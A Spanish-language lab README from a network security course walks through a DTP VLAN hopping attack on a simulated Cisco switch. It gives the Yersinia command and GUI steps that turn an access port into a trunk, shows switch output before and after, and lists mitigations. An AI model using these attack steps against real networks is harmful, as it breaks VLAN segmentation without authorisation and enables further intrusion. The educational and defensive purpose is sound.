# DTP VLAN Hopping Attack — Conversión de Puerto Access a Trunk

## Objetivo del Ataque

Convertir un puerto de acceso (*access*) de un switch Cisco en un enlace troncal (*trunk*) aprovechando el protocolo **DTP (Dynamic Trunking Protocol)**, obteniendo visibilidad sobre todas las VLANs que transitan por el switch sin autorización.

## Descripción

Este laboratorio demuestra un ataque de **VLAN Hopping mediante DTP** utilizando la herramienta **Yersinia**. Al enviar tramas DTP `Desirable` desde la máquina atacante hacia un puerto configurado en modo `dynamic auto`, el switch negocia automáticamente el enlace como trunk, rompiendo la segmentación por VLANs.

Link al video: https://youtu.be/EbS1Wq1NCzk 

## Topología de Red

```
               [ R1 — Gateway / DNS ]
                    (10.7.2.254)
                         |
                         | trunk
                         |
                   [ SW-1 — Core ]
                   (VTP Server)
                   (10.7.2.1)
                  /             \
         trunk  /               \  trunk
               /                 \
     [ SW-2 — Acceso ]      [ SW-3 — Distribución ]
      (VTP Client)            (VTP Client)
      (10.7.2.2)              (10.7.2.3)
        |         |
dynamic |         | access
  auto  |         | VLAN 10
        |         |
  [Atacante]   [Víctima]
  (10.7.2.151) (10.7.2.100)
```

## Entorno del Laboratorio

| Dispositivo | Dirección IP | Función |
|---|---|---|
| **R1 (Router)** | `10.7.2.254` | Gateway y servidor DNS local |
| **SW-1 (Core)** | `10.7.2.1` | VTP Server — dominio `ITLA-SEC` |
| **SW-2 (Acceso)** | `10.7.2.2` | VTP Client — objetivo del ataque DTP |
| **SW-3 (Distribución)** | `10.7.2.3` | VTP Client — verificación de propagación |
| **Atacante (user-pc)** | `10.7.2.151` | Estación de ataque |
| **Víctima** | `10.7.2.100` | Máquina objetivo en VLAN 10 |

- **Segmento de red:** `10.7.2.0/24`
- **Interfaz del atacante:** `ens3`
- **Puerto vulnerable:** `Et0/1` de SW-2 en modo `dynamic auto`
- **Simulador:** PNETLab

## ¿Por qué es vulnerable?

El modo `dynamic auto` espera pasivamente que el extremo opuesto proponga un enlace trunk. Cualquier dispositivo puede enviar tramas DTP `Desirable` y forzar la negociación sin necesidad de credenciales ni acceso físico al switch.

```
SW-2(config)# interface ethernet 0/1
SW-2(config-if)# switchport mode dynamic auto   ← Configuración vulnerable
```

## Requisitos

### Software

- **Yersinia** — herramienta de ataques a protocolos de Capa 2
- Permisos de superusuario (root)
- PNETLab o GNS3 con imágenes IOS de Cisco

### Red

- Estar conectado físicamente (o virtualmente) a un puerto del switch objetivo
- El puerto debe estar en modo `dynamic auto` o `dynamic desirable`

## Instalación

```bash
# Instalar Yersinia
sudo apt update
sudo apt install yersinia -y

# Configurar la interfaz del atacante
sudo ip addr flush dev ens3
sudo ip addr add 10.7.2.151/24 dev ens3
sudo ip link set dev ens3 up
```

## Verificación ANTES del Ataque

Ejecuta en la consola de **SW-2**:

```
SW-2# show interfaces trunk
```

Solo debe aparecer el enlace hacia SW-1 (`Et0/0`). El puerto del atacante (`Et0/1`) no debe figurar como trunk.

```
SW-2# show interfaces e0/1 switchport
```

Resultado esperado antes del ataque:

```
Administrative Mode: dynamic auto
Operational Mode: static access      ← Puerto en modo acceso
```

## Ejecución del Ataque

### Opción A — Interfaz gráfica de Yersinia

```bash
sudo yersinia -G
```

1. Ir a **Edit → Edit Interfaces** y activar `ens3`
2. Hacer clic en la pestaña **DTP**
3. Clic en **Launch Attack**
4. Seleccionar **"enabling trunk"**
5. Clic en **OK**

### Opción B — Línea de comandos (CLI)

```bash
sudo yersinia dtp -attack 1 -interface ens3
```

El parámetro `-attack 1` corresponde al modo *enabling trunk* (envía tramas DTP Desirable).

## Verificación DESPUÉS del Ataque

```
SW-2# show interfaces trunk
```

Resultado esperado tras el ataque:

```
Port        Mode         Encapsulation  Status        Native vlan
Et0/0       on           802.1q         trunking      1
Et0/1       auto         802.1q         trunking      1   ← ¡Nuevo trunk activo!
```

```
SW-2# show interfaces e0/1 switchport
```

```
Administrative Mode: dynamic auto
Operational Mode: trunk              ← Cambió de access a trunk
```

## ¿Qué se logra con este ataque?

Una vez que el puerto pasa a modo trunk, la máquina atacante tiene acceso a **todas las VLANs** que transitan por SW-2, rompiendo completamente la segmentación de red. Esto habilita los ataques de las fases siguientes: inyección VTP y DNS Spoofing.

## Flujo del Ataque

```
[Atacante]                          [SW-2 Et0/1]
    │                                     │
    │── DTP Desirable ──────────────────▶ │
    │                                     │ (negocia trunk)
    │◀──────────────── DTP Agreement ──── │
    │                                     │
    │     Puerto cambia: access → trunk   │
    │                                     │
    │◀══ Acceso a TODAS las VLANs ═══════▶│
```

## Mitigaciones

- **Deshabilitar DTP explícitamente** en todos los puertos de acceso:
  ```
  SW(config-if)# switchport nonegotiate
  SW(config-if)# switchport mode access
  ```
- **Configurar la VLAN nativa** en una VLAN dedicada y sin uso.
- **Apagar puertos no utilizados** y asignarlos a una VLAN de cuarentena.
- **Port Security** para limitar MACs permitidas por puerto.

## Estructura del Repositorio

```
DTP_VLAN_Hopping/
└── README.md       # Esta documentación
```

## Tecnologías Utilizadas

- **Yersinia** — Ataques a protocolos de Capa 2 (DTP, VTP, STP, CDP)
- **Cisco IOS** — Switches virtualizados en PNETLab
- **PNETLab** — Plataforma de emulación de red

---

> **⚠️ AVISO IMPORTANTE**
>
> Este laboratorio fue desarrollado **exclusivamente con fines educativos** como parte de la materia **Seguridad de Redes** en el **Instituto Tecnológico de Las Américas (ITLA)**.
>
> El uso de estas técnicas en redes sin autorización explícita es **ilegal** y puede conllevar consecuencias legales severas.
>
> **Matrícula:** 2025-0702
> **Docente:** Jonathan Rondón
> **Institución:** Instituto Tecnológico de Las Américas (ITLA)
